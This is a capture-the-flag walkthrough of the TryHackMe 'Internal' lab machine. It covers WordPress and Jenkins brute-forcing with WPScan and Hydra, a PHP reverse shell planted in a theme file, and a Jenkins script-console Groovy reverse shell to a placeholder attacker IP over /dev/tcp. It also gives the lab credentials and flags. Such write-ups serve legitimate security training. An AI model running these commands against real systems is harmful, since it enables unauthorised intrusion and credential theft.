## About Internal

**Name:** Internal

**Room:** https://tryhackme.com/room/internal

**Difficulty:** Hard

**OS:** Linux

**Target IP:** `10.48.157.111`

---
## Enumeration

An initial Nmap scan was performed against the target to identify open ports, running services, and the operating system:

```
nmap -sC -sV -Pn -O 10.48.157.111 -oN Internal
```

The scan revealed two open ports: **port 22 (SSH)** and **port 80 (HTTP)**. Since SSH needs valid credentials to be useful and we didn't have any yet, port 80 was the logical place to start digging.

![](Assets/Nmap.png)


Browsing to `http://10.48.157.111` just gave us the default Apache2 landing page - nothing custom, nothing useful in the page source either. So we moved on to directory brute-forcing to see if anything was hidden behind the default page.

![](Assets/Default_Apache.png)

Using `ffuf` with a medium-sized wordlist, we enumerated hidden directories:

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.48.157.111/FUZZ 
```

![](Assets/Directory_Burteforcing.png)


This turned up a `/blog/` directory, which hosted a completely different interface from the default Apache page - a strong sign we'd found the real application.

![](Assets/Interface.png)


Navigating to `http://10.48.157.111/blog/` revealed a WordPress-style site. A bit more digging led us to the login page at `http://internal.thm/blog/wp-login.php`.

![](Assets/login_page.png)

## Foothold

I tried a few default and commonly used credentials against the login page and confirmed that the username **admin** was valid - the login form's error message gave this away even without knowing the password yet.

![](Assets/admin.png)

To recover the password, we used WPScan to brute-force the admin account via WordPress's **XML-RPC interface**. XML-RPC is worth targeting specifically because it allows multiple login attempts to be bundled into a single request, which makes brute-forcing through it noticeably faster than hitting the normal login form directly:

```
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/
```


After waiting a few minutes, this attack successfully returned a valid password for the `admin` account.

![700](Assets/admin_password.png)


We logged in with the recovered credentials, which took us to the WordPress dashboard. A "Remind me later" prompt appeared on first login, so we just dismissed it and moved on.

![](Assets/Remind_me_later.png)

With dashboard access secured, our next goal was to find a way to execute code on the server. WordPress admins have access to **Appearance → Theme Editor**, which lets us directly edit the PHP files of any installed theme. 

![](Assets/dashboard2.png)

An inactive theme can be selected to avoid corrupting the primary theme. An alternate theme such as `Twenty Seventeen` can be chosen instead.

![](Assets/theme.png)

We inserted a PHP reverse shell payload, sourced from [pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), into the theme's `404.php` file.

![](Assets/payload.png)


After saving the file, we started a netcat listener on our attack machine and triggered the payload by browsing to:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```


This returned a reverse shell connection, confirming our foothold on the target.

![](Assets/reverse-shell.png)


Navigating to the home directory, we found a user folder, but our current shell (running as the web server user) didn't have the privileges to access its contents directly.

![](Assets/denied.png)

I spent roughly thirty minutes manually poking around before running a broader search for text files across the filesystem, since config files, notes, and leftover credentials are often stored in plain `.txt` files:

```
find / -type f -name "*.txt" 2>/dev/null
```

![](Assets/txt2.png)


Reading through the results, one file revealed the credentials `aubreanna:bubb13guM!@#123`.

![](Assets/credentials2.png)


Switching to the `aubreanna` account with these credentials gave us access to the **user flag**: `THM{int3rna1_fl4g_1}`

![700](Assets/user.txt.png)

## Privilege Escalation

Continuing our enumeration under this user, we found a file named `jenkins.txt`, which pointed us to a hidden service running internally on **port 8080**, meaning it wasn't reachable directly from our attack machine over the network.

![](Assets/hidden.png)

Since the Jenkins service was not directly reachable, an SSH local port forward was established to tunnel traffic from the attack machine to the target's internal service:

```
ssh -L 1234:localhost:8080 aubreanna@10.48.157.111
```


With the tunnel in place, we could access the Jenkins web interface locally at `http://127.0.0.1:1234`.

![](Assets/jenkins.png)


We then brute-forced the Jenkins login form using Hydra to recover valid administrator credentials:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 1234 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password'
```


This returned valid credentials, `admin:spongebob`, which we used to log in successfully.

![](Assets/creds.png)

With administrative access confirmed, we had access to Jenkins's built-in **Script Console** at `http://127.0.0.1:1234/script`. Using this script console, we can run arbitrary commands, functioning similarly to a web shell. Here, we used the following script to get a reverse shell:

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

![](Assets/console.png)


Running this script gave us a reverse shell on our netcat listener. From here, we checked `/opt` and found a `note.txt` file containing the root credentials `root:tr0ub13guM!@#123`.

![](Assets/root.png)

We logged in as root over SSH using these credentials, confirming full compromise of the machine and giving us access to the **root flag**: `THM{d0ck3r_d3str0y3r}`.

![](Assets/root.txt.png)

---
